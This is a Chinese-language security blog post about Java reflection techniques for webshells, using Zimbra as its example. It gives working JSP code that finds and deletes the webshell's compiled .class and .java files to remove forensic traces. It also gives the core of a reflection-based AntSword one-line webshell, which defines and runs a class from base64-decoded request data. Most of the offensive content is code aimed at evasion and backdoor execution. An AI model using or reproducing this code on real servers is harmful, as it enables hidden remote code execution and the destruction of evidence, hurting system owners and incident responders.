---
layout: post
title: Java利用技巧——通过反射实现webshell编译文件的自删除
---


## 0x00 前言
---

我们知道，当我们访问jsp文件时，Java环境会先将jsp文件转换成`.class`字节码文件，再由Java虚拟机进行加载，这导致了Java服务器上会生成对应名称的`.class`字节码文件。对于webshell，这会留下痕迹。
为了实现自删除`.class`字节码文件，我们可以通过反射获得`.class`字节码文件的路径，再进行删除。本文将以Zimbra环境为例，结合[AntSword-JSP-Template](https://github.com/AntSwordProject/AntSword-JSP-Template)，分析利用思路。

## 0x01 简介
---

本文将要介绍以下内容：

- 通过反射实现webshell编译文件的自删除
- 通过反射实现AntSword-JSP-Template

## 0x02 通过反射实现webshell编译文件的自删除
---

根据上篇文章《Java利用技巧——通过反射修改属性》的内容，我们按照映射`request`->`_scope`->`_servlet`->`rctxt`->`jsps`，通过多次反射最终能够获得JspServletWrapper实例

查看JspServletWrapper类中的成员，`jsps`->`value`->`ctxt`->`servletJavaFileName`保存`.java`编译文件的路径，`jsps`->`value`->`ctxt`->`classFileName`保存`.class`编译文件的路径，示例如下图

![Alt text](./2-1.png)

为了只筛选出当前jsp，可以通过request类的`getServletPath()`方法获得当前Servlet，如下图

![Alt text](./2-2.png)

从ctxt对象获取servletJavaFileName可以调用JspCompilationContext类的`getServletJavaFileName()`方法，如下图

![Alt text](./2-3.png)

从ctxt对象获取classFileName可以调用JspCompilationContext类的`getClassFileName()`方法，如下图

![Alt text](./2-4.png)

综上，由此我们可以得出通过反射获取编译文件路径的实现代码如下：

```
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap" %>
<%@ page import="java.util.*" %>
<%@ page import="org.apache.jasper.servlet.JspServletWrapper" %>
<%@ page import="org.apache.jasper.JspCompilationContext" %>
<%       
    Field f = request.getClass().getDeclaredField("_scope");
    f.setAccessible(true);  
    Object obj1 = f.get(request);
    f = obj1.getClass().getDeclaredField("_servlet");
    f.setAccessible(true);
    Object obj2 = f.get(obj1);
    f = obj2.getClass().getSuperclass().getDeclaredField("rctxt");
    f.setAccessible(true);
    Object obj3 = f.get(obj2);
    f = obj3.getClass().getDeclaredField("jsps");
    f.setAccessible(true);
    ConcurrentHashMap obj4 = (ConcurrentHashMap)f.get(obj3);   
    JspServletWrapper jsw = (JspServletWrapper)obj4.get(request.getServletPath());
    JspCompilationContext ctxt = jsw.getJspEngineContext();
    out.println(ctxt.getServletJavaFileName());
    out.println(ctxt.getClassFileName());
%>
```

删除编译文件的代码如下：

```
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap" %>
<%@ page import="java.util.*" %>
<%@ page import="org.apache.jasper.servlet.JspServletWrapper" %>
<%@ page import="org.apache.jasper.JspCompilationContext" %>
<%@ page import="java.io.File" %>
<%       
    Field f = request.getClass().getDeclaredField("_scope");
    f.setAccessible(true);  
    Object obj1 = f.get(request);
    f = obj1.getClass().getDeclaredField("_servlet");
    f.setAccessible(true);
    Object obj2 = f.get(obj1);
    f = obj2.getClass().getSuperclass().getDeclaredField("rctxt");
    f.setAccessible(true);
    Object obj3 = f.get(obj2);
    f = obj3.getClass().getDeclaredField("jsps");
    f.setAccessible(true);
    ConcurrentHashMap obj4 = (ConcurrentHashMap)f.get(obj3);   
    JspServletWrapper jsw = (JspServletWrapper)obj4.get(request.getServletPath());
    JspCompilationContext ctxt = jsw.getJspEngineContext();
    File targetFile;
    targetFile = new File(ctxt.getClassFileName());
    targetFile.delete();
    targetFile = new File(ctxt.getServletJavaFileName());
    targetFile.delete();
%>
```

## 0x03 通过反射实现AntSword-JSP-Template
---

rebeyond在[《利用动态二进制加密实现新型一句话木马之Java篇》](https://xz.aliyun.com/t/2744)介绍了Java一句话木马的实现方法，[AntSword-JSP-Template](https://github.com/AntSwordProject/AntSword-JSP-Template)也采用了相同的方式

我在测试[AntSword-JSP-Template](https://github.com/AntSwordProject/AntSword-JSP-Template)的过程中，发现编译文件会多出一个，例如`test.jsp`，访问后，生成的编译文件为`test_jsp.class`和`test_jsp.java`，如果使用了[AntSword-JSP-Template](https://github.com/AntSwordProject/AntSword-JSP-Template)，会额外生成编译文件`test_jsp$U.class`

rebeyond在[《利用动态二进制加密实现新型一句话木马之Java篇》](https://xz.aliyun.com/t/2744)提到：

> “正常情况下，Java并没有提供直接解析class字节数组的接口。不过classloader内部实现了一个protected的defineClass方法，可以将byte[]直接转换为Class
因为该方法是protected的，我们没办法在外部直接调用，当然我们可以通过反射来修改保护属性，不过我们选择一个更方便的方法，直接自定义一个类继承classloader，然后在子类中调用父类的defineClass方法。”

这里我打算通过反射修改保护属性，调用ClassLoader类的`defineClass()`方法

在ClassLoader类中，`defineClass()`方法有多个重载，如下图

![Alt text](./3-1.png)

这里选择`defineClass(byte[] b, int off, int len)`

rebeyond在[《利用动态二进制加密实现新型一句话木马之Java篇》](https://xz.aliyun.com/t/2744)还提到：

> “如果想要顺利的在equals中调用Request、Response、Seesion这几个对象，还需要考虑一个问题，那就是ClassLoader的问题。JVM是通过ClassLoader+类路径来标识一个类的唯一性的。我们通过调用自定义ClassLoader来defineClass出来的类与Request、Response、Seesion这些类的ClassLoader不是同一个，所以在equals中访问这些类会出现java.lang.ClassNotFoundException异常”

解决方法同样是复写ClassLoader的如下构造函数，传递一个指定的ClassLoader实例进去：

```
ClassLoader loader = new ClassLoader(getClass().getClassLoader()) {};
```

最终，得到通过反射实现[AntSword-JSP-Template](https://github.com/AntSwordProject/AntSword-JSP-Template)的核心代码：

```
Method d= ClassLoader.class.getDeclaredMethod("defineClass",byte[].class, int.class, int.class);
d.setAccessible(true);
ClassLoader loader = new ClassLoader(getClass().getClassLoader) {};
Class result = (Class) d.invoke(loader, base64Decode(data),0,base64Decode(data).length); 
result.newInstance().equals(pageContext);
```

访问通过反射实现[AntSword-JSP-Template](https://github.com/AntSwordProject/AntSword-JSP-Template)的`test.jsp`后，额外生成的编译文件为`test_jsp$1.class`

## 0x04 小结
---

本文介绍了通过反射实现webshell编译文件自删除和[AntSword-JSP-Template](https://github.com/AntSwordProject/AntSword-JSP-Template)，记录关于反射的学习心得。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)




